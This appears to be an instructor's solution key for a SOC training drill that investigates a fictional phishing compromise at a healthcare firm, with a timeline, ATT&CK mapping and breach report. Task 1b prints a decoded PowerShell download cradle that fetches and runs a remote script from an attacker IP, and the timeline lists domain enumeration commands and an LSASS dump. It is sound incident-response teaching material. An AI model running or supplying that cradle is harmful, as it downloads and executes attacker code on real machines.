# Drill 01 Intermediate Solution: Phishing Incident Investigation

## Instructor Notes

This solution documents all expected findings.
Share with students after they complete the drill.

---

## Task 1 Solution: Validate and Upgrade Severity

### 1a — Phishing Email Details

**Subject:** "Important: Your Benefits Enrollment Confirmation Required"

**Sender:** `hr-noreply@medtech-benefits.net` (spoofing the legitimate `medtech.com` domain)

**Sender IP:** `91.200.12.47`

**Attachment:** `BenefitsEnrollment2024.docm`

**SPF/DKIM/DMARC:** All FAIL — DMARC policy was `none` (not enforced)

**Red flags:**

* Domain `medtech-benefits.net` ≠ `medtech.local` or `medtech.com`
* HR-related lure targeting an HR Manager — high social engineering targeting
* DMARC fail + delivered = control gap

### 1b — Decoded PowerShell Command

The Base64 encoded string decodes to:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://91.200.12.47/payload/stage2.ps1')
```

This is **`IEX` (Invoke-Expression) downloading and executing a remote PowerShell script** from the attacker's C2 server.
This is a confirmed PowerShell download cradle — a classic T1059.001 + T1105 pattern.

### 1c — Severity Upgrade

**Upgrade to P1 (Critical).**

Justification:

* HR Manager account (`kbaker`) = HIGH criticality (access to employee PII)
* HR Server (`HR-SRV01`) = HIGH criticality (2,800 employee PII records)
* Active C2 session confirmed
* Healthcare context: employee PII may include medical information → HIPAA/GDPR implications
* Evidence of lateral movement (Task 4) → multiple systems compromised

---

## Task 2 Solution: Scope — All Victims

### 2a — Other Campaign Targets

Both `kbaker` and `dpatel` received the same phishing email from the same sender IP.

### 2b — Link Clicks

Both users clicked the phishing link:

* `kbaker` clicked at 11:08:42 UTC → confirmed macro execution
* `dpatel` clicked at 11:10:00 UTC → no macro execution confirmed in logs

**Action:** WS-DPATEL must be investigated — the lack of Sysmon macro execution event may mean:

* WINWORD was not used on WS-DPATEL (different email client)
* The Sysmon policy on WS-DPATEL is less verbose
* WS-DPATEL needs full investigation regardless

### 2c — C2 Connections

Only `WS-KBAKER` (10.10.1.45) has confirmed C2 connection to `91.200.12.47`.

---

## Task 3 Solution: Attack Timeline

```text
DateTime (UTC)           System      Source    Event                                  Phase        ATT&CK
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
2024-11-18 11:07:42     MAIL01      email     Phishing email delivered to kbaker      Delivery     T1566.001
2024-11-18 11:08:42     WS-KBAKER   sysmon    WINWORD→CMD→PS -W Hidden -Enc [DL]     Exploit      T1204.002
2024-11-18 11:09:00     WS-KBAKER   proxy     HTTP GET to C2 track URL (link click)  Delivery     T1566.001
2024-11-18 11:10:00     MAIL01      email     Same phishing email delivered to dpatel Delivery     T1566.001
2024-11-18 11:10:00     WS-KBAKER   sysmon    TCP 443 to 91.200.12.47 (C2 session)  C2           T1071.001
2024-11-18 11:10:00     PROXY01     proxy     dpatel clicked phishing link            Delivery     T1566.001
2024-11-18 11:15:00     WS-KBAKER   sysmon    net user /domain (AD enum)             Discovery    T1087.002
2024-11-18 11:15:24     WS-KBAKER   sysmon    net group "Domain Admins" /domain      Discovery    T1069.002
2024-11-18 11:50:00     WS-KBAKER   sysmon    LSASS read (Mimikatz-like)             CredDump     T1003.001
2024-11-18 12:00:00     HR-SRV01    winlogs   4624 Type3 logon from WS-KBAKER        Lateral Mvmt T1021.002
2024-11-18 12:02:00     HR-SRV01    winlogs   employees_all.xlsx file accessed       Collection   T1213
2024-11-18 12:05:00     FW01        firewall  15MB outbound to 91.200.12.47:443      Exfiltration T1048.002
```

---

## Task 4 Solution: Lateral Movement

**Confirmed:** Authentication from `WS-KBAKER` (10.10.1.45) to `HR-SRV01` using `kbaker` credentials (Logon Type 3 — network logon).

**Technique:** T1021.002 — Remote Services: SMB/Windows Admin Shares

**Severity impact:** Lateral movement to HR server containing PII → P1 confirmed.

**Note:** The attacker used `kbaker`'s own credentials (likely harvested from LSASS at 11:50).
This is a Pass-the-Hash or credential replay pattern.

---

## Task 5 Solution: Data Exposure

**5a — File Access on HR-SRV01:**
`employees_all.xlsx` was accessed — this is the full employee database containing 2,800 PII records.

**5b — Outbound Transfer:**
15 MB (`bytes_out: 15,728,640`) transferred to `91.200.12.47:443` — this is the exfiltration.

**5c — Data Breach Notification Status:**

```text
Data type:    Employee PII (names, contact details, potentially salary/medical data)
Records:      2,800 employees
Accessed:     CONFIRMED — employees_all.xlsx opened
Exfiltrated:  CONFIRMED — 15 MB transferred to attacker IP
Breach notification required: YES
  → GDPR: 72-hour notification to supervisory authority (if EU employees)
  → HIPAA: If medical data included — 60-day notification
  → Engage Data Protection Officer immediately
  → Engage Legal Counsel
```

---

## Complete Investigation Report (Expected Output)

```markdown
INCIDENT INVESTIGATION REPORT
==============================
Incident ID:    INC-2024-1118-001
Analyst:        [Student name]
Date:           2024-11-18

SUMMARY
A targeted phishing email impersonating MedTech HR was delivered to at
least two employees (kbaker and dpatel). Karen Baker (Senior HR Manager)
opened the malicious attachment, which triggered a PowerShell download
cradle establishing C2. The attacker performed credential dumping and
laterally moved to HR-SRV01, where they accessed and exfiltrated the full
employee database (2,800 PII records). This is a confirmed P1 incident
requiring immediate breach notification assessment.

AFFECTED SYSTEMS
WS-KBAKER  | 10.10.1.45 | COMPROMISED | Macro exec, LSASS dump, C2
HR-SRV01   | 10.10.2.10 | DATA BREACH | File accessed, data exfiltrated
WS-DPATEL  | 10.10.1.67 | SUSPECTED   | Clicked link, no exec confirmed

ATT&CK MAPPING
T1566.001 | Spearphishing Attachment  | Initial Access
T1204.002 | User Execution            | Execution
T1059.001 | PowerShell                | Execution
T1105     | Ingress Tool Transfer     | C2
T1071.001 | Web Protocols (HTTPS C2)  | C2
T1087.002 | Domain Account Discovery  | Discovery
T1069.002 | Domain Group Discovery    | Discovery
T1003.001 | LSASS Credential Dump     | Credential Access
T1021.002 | SMB Lateral Movement      | Lateral Movement
T1213     | Data from Info Repos      | Collection
T1048.002 | Exfil over HTTPS          | Exfiltration

IOCs
91.200.12.47        | Attacker IP (C2 + phishing delivery)
medtech-benefits.net| Phishing domain
dead0c0ffee...      | SHA256 of BenefitsEnrollment2024.docm

IMMEDIATE ACTIONS
[x] Isolate WS-KBAKER via EDR
[x] Disable kbaker AD account
[x] Block 91.200.12.47 at perimeter
[x] Block medtech-benefits.net at DNS
[ ] Investigate WS-DPATEL
[ ] Notify CISO and DPO — breach notification required
[ ] Legal hold on evidence
```
